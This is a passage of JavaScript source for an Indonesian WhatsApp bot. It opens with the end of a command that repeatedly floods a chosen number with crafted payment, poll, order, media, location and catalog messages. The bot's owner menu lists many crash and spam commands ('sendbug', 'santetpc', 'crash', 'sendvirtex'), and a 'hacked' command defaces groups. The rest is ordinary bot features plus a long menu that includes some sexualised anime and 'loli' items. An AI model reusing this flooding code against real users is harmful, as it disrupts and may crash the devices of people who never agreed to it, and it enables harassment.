var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: lep })
var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-Dani ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: lep })
var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-Dani ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: lep })
var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: lep })
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-Dani ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
Dani.relayMessage(numt, buginvite.message, { messageId: buginvite.key.id })
Dani.relayMessage(numt, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
Dani.relayMessage(numt, pollCreation.message, { messageId: pollCreation.key.id })
Dani.relayMessage(numt, order.message, { messageId: order.key.id })
Dani.relayMessage(numt, audio.message, { messageId: audio.key.id })
Dani.relayMessage(numt, image.message, { messageId: image.key.id })
Dani.relayMessage(numt, document.message, { messageId: document.key.id })
Dani.relayMessage(numt, liveLocation.message, { messageId: liveLocation.key.id })
Dani.relayMessage(numt, sticker.message, { messageId: sticker.key.id })
Dani.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-Dani ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-Dani ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, pp_bot, { quoted: lep })
Dani.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
}
}
break
case 'addrespon':
case 'addresp':
 addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply(`masukan pesan|balasan`)
var pesan = q.split('|')[0] ? q.split('|')[0] : q
var balas = q.split('|')[1] ? q.split('|')[1] : ''
if (checkCommands(pesan, commandsDB) === true) return m.reply(`Udah ada`)
addCommands(pesan, balas, sender, commandsDB)
m.reply(`Pesan : ${pesan}\nBalas : ${balas}\nSuskes Di Tambahankan!`)
break
case 'delrespon': case 'delresp':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!checkCommands(q, commandsDB)) return m.reply(`Ga ada di database`)
deleteCommands(q, commandsDB)
m.reply(`Respon ${q} telah di hapus`)
break
case 'listrespon': case 'listresp':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
var teks = `\`\`\`「 LIST RESPON  」\`\`\`\n\n`
for (let i = 0; i < commandsDB.length; i ++){
teks += `❏ *Tanya:* ${commandsDB[i].pesan}\n`
teks += `❏ *Balasan:* ${commandsDB[i].balasan}\n\n`
}
m.reply(teks)
break
case 'addbadword': 
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (args.length < 1) return m.reply( `Ketik ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword tolol`)
const bw =  args.join(" ")
bad.push(bw)
fs.writeFileSync('./database/data/toxic.json', JSON.stringify(bad))
m.reply(mess.success)
break
case 'delbadword': case 'ubadword':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!m.key.fromMe && !isCreator) return sticOwner(from)
if (args.length < 1) return m.reply( `Ketik ${prefix}delbadword [kata kasar]. contoh ${prefix+command} tolol`)
const bwd =  args.join(" ") 
var arr = bad
for( var dp = 0; dp < arr.length; dp++){ 
if ( arr[dp] === bwd) { 
arr.splice(dp, 1); 
dp--; 
fs.writeFileSync('./database/data/toxic.json',JSON.stringify(arr))}}
m.reply(mess.success)
break
case 'listbadword': 
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
teks = '*Badword List :*\n\n'
for (let awokwkwk of bad) {
teks += `├❏  ${awokwkwk}\n`
}
teks += `└❏ *Total : ${bad.length}*\n\n_Untuk add badword silahkan ketik ${prefix}addbadword_`
Dani.sendMessage(m.chat, { text: teks }, { quoted: freply })
break
case 'hacked':
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply('Teksnya?')
m.reply('Otw Hack')
Dani.updateProfilePicture(m.chat, { url: `https://i.ibb.co/m4Qx3JG/20210319-204838.jpg` })
await sleep(1000)
Dani.groupUpdateSubject(from, `HACKED BY ${q}`)
await sleep(1000)
Dani.groupUpdateDescription(from, `_${q} telah meretas grup ini_`)             
await sleep(1000)
Dani.sendMessage(m.chat, { text: `Succes Hacked` }, { quoted: freply })
break
case 'setmenu': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
let setbot = db.data.settings[botNumber]
if (args[0] === 'templateImage'){
setbot.templateImage = true
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateMsg = false
setbot.templateLocation = false
m.reply(mess.success)
} else if (args[0] === 'templateVideo'){
setbot.templateImage = false
setbot.templateVideo = true
setbot.templateGif = false
setbot.templateMsg = false
setbot.templateLocation = false
m.reply(mess.success)
} else if (args[0] === 'templateGif'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = true
setbot.templateMsg = false
setbot.templateLocation = false
m.reply(mess.success)
} else if (args[0] === 'templateMessage'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateMsg = true
setbot.templateLocation = false
m.reply(mess.success)
} else if (args[0] === 'templateLocation'){
setbot.templateImage = false
setbot.templateVideo = false
setbot.templateGif = false
setbot.templateMsg = false
setbot.templateLocation = true
m.reply(mess.success)
} else {
let sections = [
{
title: "CHANGE MENU BOT",
rows: [
{title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
{title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
{title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
{title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`},
{title: "Template Location", rowId: `setmenu templateLocation`, description: `Change menu bot to Template Location`}
]
},
]
Dani.sendListMsg(m.chat, `Please select the menu you want to change!`, `Made With 🤍 Dani | Copyright 2022`, `Hello Owner !`, `Click Here`, sections, freply)
}
}
break
case 'allmenu': case 'help': case 'menu': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
reqXp  = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
let anup = await fetchJson(`https://raw.githubusercontent.com/DaniDev1337/database/master/text/quotes.json`)
let result = anup[Math.floor(Math.random() * anup.length)]
let cBandwidth = await checkBandwidth()
let anu = `_*Hi Kak ${pushname} ${ucapanWaktu} 👋.*_

*[   STATISTIC BOT  ]*

❏ _*Upload* : ${cBandwidth.upload}_
❏ _*Download* : ${cBandwidth.download}_

*[   QUOTES HARIAN   ]*

❏ _*Author* : ${result.author}_
❏ _*Quotes* : ${result.quotes}_

*[   USER INFO   ]*

❏ *Username* : ${pushname}
❏ *Rank* : ${role}
❏ *Limit* : ${isPremium ? 'Unlimited' : getLimit(sender, limitCount, limit)}
❏ *Limit Game* : ${isPremium ? 'Unlimited' : cekGLimit(sender, gcount, glimit)}
❏ *XP* : ${getLevelingXp(sender)}/${reqXp}
❏ *Belance* : $${(getBalance(sender, balance))}
${readmore}
*｢  OWNER MENU  ｣*

» >
» =>
» $
» ${prefix}ban
» ${prefix}unban
» ${prefix}listban
» ${prefix}getcase
» ${prefix}mode 
» ${prefix}self
» ${prefix}public
» ${prefix}culik
» ${prefix}creategc
» ${prefix}autobio 
» ${prefix}autovn
» ${prefix}autoketik
» ${prefix}autoblock
» ${prefix}anticall
» ${prefix}react 
» ${prefix}chat 
» ${prefix}join 
» ${prefix}setbio
» ${prefix}setnamebot
» ${prefix}leave
» ${prefix}block 
» ${prefix}unblock 
» ${prefix}bcgc 
» ${prefix}bcall 
» ${prefix}bcimg
» ${prefix}bcaudio
» ${prefix}bcvideo
» ${prefix}bcloc
» ${prefix}setppbot 
» ${prefix}setexif
» ${prefix}restart
» ${prefix}setmenu 
» ${prefix}sewa 
» ${prefix}shutdown
» ${prefix}sendbuggc
» ${prefix}sendbuggcdoc
» ${prefix}sendbuggcloc
» ${prefix}santetpc
» ${prefix}santetgc
» ${prefix}santedpcparah
» ${prefix}santedgcparah
» ${prefix}spambugvip
» ${prefix}crash
» ${prefix}jagoan
» ${prefix}jagoanneon
» ${prefix}buggc
» ${prefix}sendbug
» ${prefix}sendbug2
» ${prefix}sendbugdocument
» ${prefix}sendbugkontak
» ${prefix}sendbugvn
» ${prefix}sendvirtex
» ${prefix}sendbuglokasi
» ${prefix}sendbugcatalog
» ${prefix}sendbugitem
» ${prefix}sendbugsticker
» ${prefix}buglokasi
» ${prefix}bugsticker
» ${prefix}bugkontak
» ${prefix}buginvite
» ${prefix}bugtroli
» ${prefix}bugaudio
» ${prefix}bugimage
» ${prefix}bugdocument

*｢  JADI BOT MENU  ｣*

» ${prefix}jadibot
» ${prefix}listjadibot

*｢  ANONYMOUS MENU  ｣*

» ${prefix}anonymous
» ${prefix}start
» ${prefix}next
» ${prefix}keluar
» ${prefix}sendcontact

*｢  DATABASE MENU  ｣*

» ${prefix}setcmd
» ${prefix}listcmd
» ${prefix}delcmd
» ${prefix}lockcmd
» ${prefix}addmsg
» ${prefix}listmsg
» ${prefix}getmsg
» ${prefix}delmsg
» ${prefix}addsticker
» ${prefix}delsticker
» ${prefix}getsticker
» ${prefix}changesticker
» ${prefix}liststicker
» ${prefix}addimage
» ${prefix}delimage
» ${prefix}getimage
» ${prefix}changeimage
» ${prefix}listimage
» ${prefix}addvideo
» ${prefix}delvideo
» ${prefix}getvideo
» ${prefix}changevideo
» ${prefix}listvideo
» ${prefix}addaudio
» ${prefix}delaudio
» ${prefix}getaudio
» ${prefix}changeaudio
» ${prefix}listaudio
» ${prefix}addrespon
» ${prefix}delrespon
» ${prefix}listrespon
» ${prefix}addbadword
» ${prefix}delbadword
» ${prefix}listbadword

*｢  STORE MENU  ｣*

» ${prefix}item
» ${prefix}additem
» ${prefix}delitem
» ${prefix}changeitem
» ${prefix}cekproses
» ${prefix}proses
» ${prefix}done

*｢  GROUP MENU  ｣*

» ${prefix}antilink 
» ${prefix}antivirtex 
» ${prefix}antiwame 
» ${prefix}antitinyul 
» ${prefix}anticuttly 
» ${prefix}antihidetag 
» ${prefix}antiviewonce 
» ${prefix}antibule
» ${prefix}antivn
» ${prefix}antiphoto
» ${prefix}antivideo
» ${prefix}antisticker
» ${prefix}autosticker 
» ${prefix}autorespon 
» ${prefix}leveling 
» ${prefix}mute 
» ${prefix}nsfw 
» ${prefix}linkgroup
» ${prefix}opentime
» ${prefix}closetime
» ${prefix}ephemeral 
» ${prefix}setppgc 
» ${prefix}setname 
» ${prefix}setdesc 
» ${prefix}group 
» ${prefix}editinfo
» ${prefix}add 
» ${prefix}kick 
» ${prefix}hidetag 
» ${prefix}tagall 
» ${prefix}promote 
» ${prefix}demote 
» ${prefix}vote 
» ${prefix}devote
» ${prefix}upvote
» ${prefix}cekvote
» ${prefix}hapusvote
» ${prefix}revoke
» ${prefix}getidgc
» ${prefix}groupinfo
» ${prefix}totag

*｢  DOWNLOAD MENU  ｣*

» ${prefix}tiktok 
» ${prefix}tiktokwm
» ${prefix}tiktoknowm
» ${prefix}tiktokaudio 
» ${prefix}cocofun
» ${prefix}cocofunwm
» ${prefix}cocofunnowm
» ${prefix}imgurdl
» ${prefix}goredl
» ${prefix}igdl
» ${prefix}igstory 
» ${prefix}gitclone 
» ${prefix}twitter 
» ${prefix}twitteraudio 
» ${prefix}mediafire 
» ${prefix}likeedl
» ${prefix}facebook
» ${prefix}pinterestdl 
» ${prefix}ytmp3 
» ${prefix}ytmp4 
» ${prefix}getmp3
» ${prefix}getmp4
» ${prefix}umma 
» ${prefix}soundcloud 
» ${prefix}googledrive
» ${prefix}sfiledl
» ${prefix}stickerpackdl 
» ${prefix}stickerlinedl 
» ${prefix}stickerteledl 

*｢  SEARCH MENU  ｣*

» ${prefix}play 
» ${prefix}google 
» ${prefix}gimage 
» ${prefix}pinterest 
» ${prefix}alphacoders 
» ${prefix}konachan 
» ${prefix}wallpaper 
» ${prefix}wikimedia 
» ${prefix}ytsearch 
» ${prefix}ringtone 
» ${prefix}layarkaca 
» ${prefix}jalantikus 
» ${prefix}cariresep 
» ${prefix}gcsearch 
» ${prefix}gsmarena 
» ${prefix}sfile 
» ${prefix}soundcloudsearch 
» ${prefix}stickerpacksearch
» ${prefix}stickerlinesearch
» ${prefix}stickertelesearch

*｢  NSFW & SFW  ｣*

» ${prefix}bully
» ${prefix}cuddle
» ${prefix}cry
» ${prefix}hug
» ${prefix}awoo
» ${prefix}kiss
» ${prefix}lick
» ${prefix}pat
» ${prefix}smug
» ${prefix}bonk
» ${prefix}yeet
» ${prefix}blush
» ${prefix}smile
» ${prefix}wave
» ${prefix}highfive
» ${prefix}handhold
» ${prefix}nom
» ${prefix}glomp
» ${prefix}bite
» ${prefix}slap
» ${prefix}kill
» ${prefix}happy
» ${prefix}wink
» ${prefix}poke
» ${prefix}dance
» ${prefix}cringe

*｢  MOVIE & STORY  ｣*

» ${prefix}wattpad 
» ${prefix}webtoons
» ${prefix}drakor 
» ${prefix}mangatoons 
» ${prefix}noveltoons
» ${prefix}film 
» ${prefix}cerpen
» ${prefix}ceritahoror
» ${prefix}bioskop
» ${prefix}bioskopnow
» ${prefix}kartun
» ${prefix}action
» ${prefix}comedy
» ${prefix}military
» ${prefix}drama

*｢  RANDOM TEXT  ｣*

» ${prefix}quotes
» ${prefix}quotesanime
» ${prefix}quotesislamic
» ${prefix}quotespubg
» ${prefix}pantun
» ${prefix}puisi
» ${prefix}faktaunik
» ${prefix}katabijak
» ${prefix}katagalau
» ${prefix}katailham
» ${prefix}katahacker
» ${prefix}katasenja
» ${prefix}katabucin
» ${prefix}katacinta
» ${prefix}katasindiran
» ${prefix}dare
» ${prefix}truth
» ${prefix}motivasi
» ${prefix}fml
» ${prefix}nickff

*｢  RANDOM VIDEO  ｣*

» ${prefix}faktamenarik
» ${prefix}jedagjedugmobilelegend
» ${prefix}jedagjedugfreefire
» ${prefix}jedagjedugpubg
» ${prefix}jedagjedugmodernwarship

*｢  RANDOM IMAGE  ｣*

» ${prefix}couple
» ${prefix}meme
» ${prefix}memesuki
» ${prefix}darkjoke
» ${prefix}darkmeme
» ${prefix}aesthetic
» ${prefix}bonekachucky
» ${prefix}pentol
» ${prefix}doraemon
» ${prefix}quotesimage
» ${prefix}quotesyt
» ${prefix}pokemon
» ${prefix}renungan
» ${prefix}satanic
» ${prefix}kpop
» ${prefix}tatasurya
» ${prefix}yulibocil
» ${prefix}wallpaperprogramming
» ${prefix}wallpaperpubg
» ${prefix}wallpapertechnology
» ${prefix}wallpaperhacker
» ${prefix}wallpapercyberspace
» ${prefix}wallpapermountain
» ${prefix}wallpaperislamic

*｢  RANDOM ANIME  ｣*

» ${prefix}milf
» ${prefix}loli
» ${prefix}husbu
» ${prefix}waifu
» ${prefix}boruto
» ${prefix}asuna
» ${prefix}ana
» ${prefix}akiyama
» ${prefix}ayuzawa
» ${prefix}erza
» ${prefix}elaina
» ${prefix}eba
» ${prefix}deidara
» ${prefix}chitoge
» ${prefix}itachi
» ${prefix}isuzu
» ${prefix}inori
» ${prefix}hinata
» ${prefix}hestia
» ${prefix}kaori
» ${prefix}kakasi
» ${prefix}kagura
» ${prefix}kaga
» ${prefix}itori
» ${prefix}mikasa
» ${prefix}madara
» ${prefix}kurumi
» ${prefix}kotori
» ${prefix}keneki
» ${prefix}rize
» ${prefix}onepiece
» ${prefix}nezuko
» ${prefix}minato
» ${prefix}miku
» ${prefix}shinomiya
» ${prefix}shinka
» ${prefix}shina
» ${prefix}sakura
» ${prefix}sasuke
» ${prefix}tsunade
» ${prefix}toukachan
» ${prefix}tejina
» ${prefix}shota
» ${prefix}shizuka
» ${prefix}akira
» ${prefix}emilia
» ${prefix}yumeko
» ${prefix}yuki
» ${prefix}yotsuba
» ${prefix}chiho
» ${prefix}kuroha
» ${prefix}kuriyama
» ${prefix}kosaki
» ${prefix}gremory
» ${prefix}chitanda
» ${prefix}nishimiya
» ${prefix}natsukawa
» ${prefix}yatogami
» ${prefix}tomori
» ${prefix}sagiri
» ${prefix}shinobu

*｢  ASUPAN MENU  ｣*

» ${prefix}asupan
» ${prefix}asupanloli
» ${prefix}asupankayes
» ${prefix}asupanhijaber
» ${prefix}asupangeayubi
» ${prefix}asupanbocil
» ${prefix}asupanukhty
» ${prefix}asupanrikagusriani
» ${prefix}asupannotnot

*｢  CECAN MENU  ｣*

» ${prefix}indonesia
» ${prefix}korea
» ${prefix}china
» ${prefix}vietnam
» ${prefix}thailand
» ${prefix}malaysia
» ${prefix}japan
» ${prefix}jeni
» ${prefix}jiso
» ${prefix}justina
» ${prefix}rose
» ${prefix}ryujin

*｢  VOKAL GENERATOR  ｣*

» ${prefix}halah 
» ${prefix}hilih 
» ${prefix}huluh 
» ${prefix}heleh 
» ${prefix}holoh 

*｢  ENTERTAINMENT  ｣*

» ${prefix}delttt
» ${prefix}tictactoe
» ${prefix}family100
» ${prefix}tebaklagu
» ${prefix}tebakgambar
» ${prefix}tebakkata
» ${prefix}tebakkalimat
» ${prefix}tabaklirik
» ${prefix}tebakkabupaten
» ${prefix}tebakanime
» ${prefix}tebakwaifu
» ${prefix}tebaktebakan
» ${prefix}tebakbendera
» ${prefix}tebakkimia
» ${prefix}tebakaplikasi
» ${prefix}tebakjenaka
» ${prefix}caklontong
» ${prefix}asahotak
» ${prefix}susunkata
» ${prefix}tekateki
» ${prefix}math [mode]
» ${prefix}suitpvp [@tag]

*｢  PHOTOOXY MENU ｣*

» ${prefix}3dnature
» ${prefix}flowertypo
» ${prefix}flaming
» ${prefix}heartcup
» ${prefix}coffee
» ${prefix}burnpaper
» ${prefix}graffiti
» ${prefix}gradientavatar
» ${prefix}glowrainbow
» ${prefix}underquotes
» ${prefix}funnycup
» ${prefix}romance
» ${prefix}quotesgrass
» ${prefix}neonlight
» ${prefix}lovemessage
» ${prefix}harrypotter
» ${prefix}summer
» ${prefix}smoketypography
» ${prefix}smoke
» ${prefix}silk
» ${prefix}doubleheart
» ${prefix}woodenboard
» ${prefix}woodheart
» ${prefix}whitecube
» ${prefix}roses
» ${prefix}camuflage
» ${prefix}shadow
» ${prefix}naruto
» ${prefix}sumer-nature-bagground
» ${prefix}sweetcandy
» ${prefix}stars
» ${prefix}fur
» ${prefix}wolf-metal
» ${prefix}under-water-ocean
» ${prefix}rainbow-shine
» ${prefix}3d-striking
» ${prefix}water-melon
» ${prefix}3d-glowing
» ${prefix}vintage
» ${prefix}candy
» ${prefix}luxury-royal
» ${prefix}cemetery-gate
» ${prefix}crisp-chrome
» ${prefix}rainbow-bagground
» ${prefix}metalic-glow
» ${prefix}illuminated-metallic
» ${prefix}orchids-flower
» ${prefix}wood-block
» ${prefix}bevel
» ${prefix}butterfly
» ${prefix}embroidery
» ${prefix}birthday-cake
» ${prefix}3d-wooden-black

*｢  TEXTPRO MENU  ｣*

» ${prefix}blood-frosted
» ${prefix}style-1917
» ${prefix}logo-galaxy
» ${prefix}neon-effects
» ${prefix}birthday-greeting
» ${prefix}blue-glitter
» ${prefix}gold-glitter
» ${prefix}rainbow-effect
» ${prefix}heart-birthday
» ${prefix}birthday-roses
» ${prefix}typography-maker1
» ${prefix}tattoo-dragon
» ${prefix}machines-effect
» ${prefix}typography-autumn
» ${prefix}typography-leaves
» ${prefix}modern-gold-red3
» ${prefix}modern-gold-green3
» ${prefix}modern-gold-sliver3
» ${prefix}modern-gold-purple3
» ${prefix}light
» ${prefix}red-hot-metal
» ${prefix}hero-crossfire
» ${prefix}swat-crossfire
» ${prefix}arch-crossfire
» ${prefix}sfg-crossfire
» ${prefix}lend
» ${prefix}metal-effect
» ${prefix}water-effect
» ${prefix}golden-letter
» ${prefix}magic
» ${prefix}metallic-letter
» ${prefix}torbjornplate-overwatch
» ${prefix}soldier-overwatch
» ${prefix}mei-overwatch
» ${prefix}gold-effect
» ${prefix}resht-league-of-kings
» ${prefix}mganga-league-of-kings
» ${prefix}name-on-hot-air-ballon
» ${prefix}violet-league-of-kings
» ${prefix}alice-league-of-kings
» ${prefix}azzenka-league-of-kings
» ${prefix}birthday-cake2
» ${prefix}birthday-cake3
» ${prefix}modern-gold3
» ${prefix}modern-gold4
» ${prefix}modern-gold5-pro
» ${prefix}bulb-effect
» ${prefix}graffiti2
» ${prefix}graffiti3
» ${prefix}graffiti4
» ${prefix}graffiti5
» ${prefix}fun-certify1
» ${prefix}fun-certify2
» ${prefix}blood
» ${prefix}water-3d
» ${prefix}galaxy-effect
» ${prefix}galaxy-effect2
» ${prefix}wings-effect
» ${prefix}3d-neonlight
» ${prefix}3d-luxury
» ${prefix}3d-love
» ${prefix}3d-golden
» ${prefix}3d-engraved
» ${prefix}3d-waterpipe
» ${prefix}3d-scifi
» ${prefix}3d-rainbow
» ${prefix}3d-papercut
» ${prefix}3d-gradient
» ${prefix}3d-underwater
» ${prefix}3d-stone
» ${prefix}3d-sub-zombie
» ${prefix}3d-ruby-stone
» ${prefix}3d-realistic
» ${prefix}bear
» ${prefix}assassin-screed
» ${prefix}art-shader
» ${prefix}anubis
» ${prefix}angel-wings-galaxy
» ${prefix}broken-glass
» ${prefix}brickwall
» ${prefix}blackpink
» ${prefix}black-metal
» ${prefix}bg-crossfire
» ${prefix}dark-gold-metal
» ${prefix}cool-metal
» ${prefix}color-fireworks
» ${prefix}circuit
» ${prefix}bubble
» ${prefix}double-exposure
» ${prefix}dinamo
» ${prefix}deluxe-silver
» ${prefix}deluxe-gold
» ${prefix}decorated-cookie
» ${prefix}fox-crossfire
» ${prefix}firework
» ${prefix}fabric
» ${prefix}eroded-metal
» ${prefix}dragon-fire
» ${prefix}genji-overwatch
» ${prefix}gankk-league-of-kings
» ${prefix}galaxy
» ${prefix}galaxy-angel
» ${prefix}futuristic
» ${prefix}glossy-chrome
» ${prefix}glossy-carbon
» ${prefix}glossy-blue-metal
» ${prefix}glossy
» ${prefix}gem-stone
» ${prefix}gold-eagle
» ${prefix}gold-bird
» ${prefix}gold-batman
» ${prefix}gold-barca
» ${prefix}gold-avenger
» ${prefix}gold-tiger
» ${prefix}gold-star
» ${prefix}gold-lion
» ${prefix}gold-fox
» ${prefix}graffiti-color
» ${prefix}hanzo-overwatch
» ${prefix}halloween-fire
» ${prefix}green-horror
» ${prefix}green-brush
» ${prefix}gr-crossfire
» ${prefix}matrix
» ${prefix}holographic
» ${prefix}heart-flashlight
» ${prefix}heart-cups
» ${prefix}heart-birthday
» ${prefix}lol-fiora
» ${prefix}lol-ezrealand-shen
» ${prefix}lol-draven
» ${prefix}lol-caitlyn
» ${prefix}lol-ahri
» ${prefix}lol-jinx
» ${prefix}lol-jhin
» ${prefix}lol-graves
» ${prefix}lol-garen
» ${prefix}lol-fizz
» ${prefix}lol-rengar
» ${prefix}lol-kogmaw
» ${prefix}lol-kalista
» ${prefix}lol-missfortune
» ${prefix}lol-quinn
» ${prefix}lol-khazix
» ${prefix}lol-leesin
» ${prefix}lol-thresh
» ${prefix}lol-lux
» ${prefix}lol-talon
» ${prefix}lol-wukong
» ${prefix}lol-sona
» ${prefix}lol-riven
» ${prefix}lol-vayne
» ${prefix}lol-nidalee
» ${prefix}lol-yasuo
» ${prefix}lol-master-yi
» ${prefix}lol-zed
» ${prefix}led
» ${prefix}magma
» ${prefix}mercy-overwatch
» ${prefix}metal-real-madrid
» ${prefix}metal-headshot
» ${prefix}metal-avenger
» ${prefix}metal-star
» ${prefix}metal-superman
» ${prefix}metalic
» ${prefix}minion
» ${prefix}neon-bright-blue
» ${prefix}neon-light-galaxy
» ${prefix}neon-satin
» ${prefix}neon-devil
» ${prefix}neon-light
» ${prefix}paper-cut
» ${prefix}paper-art
» ${prefix}reaper-overwatch
» ${prefix}sketch
» ${prefix}skeleton
» ${prefix}science
» ${prefix}wetglass
» ${prefix}word-leaves
» ${prefix}thunder
» ${prefix}sunlight-shadow
» ${prefix}snow
» ${prefix}watercolor
» ${prefix}wedding-silver
» ${prefix}transformer
» ${prefix}status-mood
» ${prefix}status-mood2
» ${prefix}status-mood3
» ${prefix}status-mood4
» ${prefix}status-love
» ${prefix}status-life
» ${prefix}status-life2
» ${prefix}status-life3
» ${prefix}word-green-fireworks
» ${prefix}wishes-birthdaycake
» ${prefix}juventus
» ${prefix}horror
» ${prefix}floral
» ${prefix}avengers
» ${prefix}spiderman
» ${prefix}metal-molding
» ${prefix}metal-marvel
» ${prefix}marvel
» ${prefix}lion-mascot
» ${prefix}classic-8bit
» ${prefix}wolf
» ${prefix}wolf-galaxy
» ${prefix}glitch
» ${prefix}thor
» ${prefix}layered
» ${prefix}gradient-logo
» ${prefix}typography-green-leaf
» ${prefix}3d-silver
» ${prefix}3d-space
» ${prefix}3d-vintage
» ${prefix}3d-galaxy-metal
» ${prefix}3d-gold
» ${prefix}3d-rose-gold
» ${prefix}ninja-mascot
» ${prefix}balloons-cards
» ${prefix}balloons-love

*｢  PHOTOFUNIA MENU  ｣*

» ${prefix}beach-sign
» ${prefix}blood-writing
» ${prefix}bracelet
» ${prefix}cemetery-gates
» ${prefix}airline
» ${prefix}frosty-window-writing
» ${prefix}denim-emdroidery
» ${prefix}christmas-writing
» ${prefix}chalk-writing
» ${prefix}balloon
» ${prefix}love-lock
» ${prefix}nightmare-writing
» ${prefix}einstein
